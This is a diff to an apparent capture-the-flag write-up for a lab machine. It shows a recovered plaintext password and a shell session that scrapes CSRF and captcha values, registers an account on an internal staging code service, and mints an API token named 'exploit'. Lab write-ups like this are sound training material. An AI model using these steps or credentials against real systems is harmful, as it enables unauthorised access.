@@ -21,3 +21,56 @@ PORT   STATE SERVICE VERSION
 ```
 ben: r04D!!_R4ge
 ```
+
+```
+ajdev@rootbox:~$ curl -s \
+  -H "Host: staging-v2-code.dev.silentium.htb" \
+  http://127.0.0.1:3001/user/sign_up \
+  -c /tmp/cookies.txt > /tmp/signup.html
+ajdev@rootbox:~$ CSRF=$(grep -oP 'name="_csrf" value="\K[^"]+' /tmp/signup.html | head -1)
+
+CAPTCHA_ID=$(grep -oP 'name="captcha_id" value="\K[^"]+' /tmp/signup.html | head -1)
+
+echo $CSRF
+echo $CAPTCHA_ID
+yf6WmYWdTp_a_dNA_fSatN8QIWg6MTc3NjI0Nzg1MjU4OTYwNTc4MA
+H0p7bLR593ZjP0N
+ajdev@rootbox:~$ curl -s \
+  -H "Host: staging-v2-code.dev.silentium.htb" \
+  -b /tmp/cookies.txt \
+  "http://127.0.0.1:3001/captcha/H0p7bLR593ZjP0N.png" \
+  -o /tmp/captcha.png
+ajdev@rootbox:~$ open /tmp/captcha.png
+ajdev@rootbox:~$ 033998
+033998: command not found
+ajdev@rootbox:~$ curl -i -s -X POST \
+  -H "Host: staging-v2-code.dev.silentium.htb" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -b /tmp/cookies.txt -c /tmp/cookies.txt \
+  --data-urlencode "_csrf=yf6WmYWdTp_a_dNA_fSatN8QIWg6MTc3NjI0Nzg1MjU4OTYwNTc4MA" \
+  --data-urlencode "user_name=hacker" \
+  --data-urlencode "email=hacker@test.com" \
+  --data-urlencode "password=Hacker123!" \
+  --data-urlencode "retype=Hacker123!" \
+  --data-urlencode "captcha_id=H0p7bLR593ZjP0N" \
+  --data-urlencode "captcha=033998" \
+  http://127.0.0.1:3001/user/sign_up
+HTTP/1.1 302 Found
+Location: /user/login
+X-Content-Type-Options: nosniff
+X-Frame-Options: deny
+Date: Wed, 15 Apr 2026 10:12:38 GMT
+Content-Length: 0
+
+ajdev@rootbox:~$ curl -s -X POST \
+  -H "Host: staging-v2-code.dev.silentium.htb" \
+  -H "Content-Type: application/json" \
+  "http://127.0.0.1:3001/api/v1/users/hacker/tokens" \
+  -u "hacker:Hacker123!" \
+  -d '{"name":"exploit"}'
+{"name":"exploit","sha1":"64d8e2232cf6fb28743634f4866012f46d362b47"}
+```
+
+```
+
+```
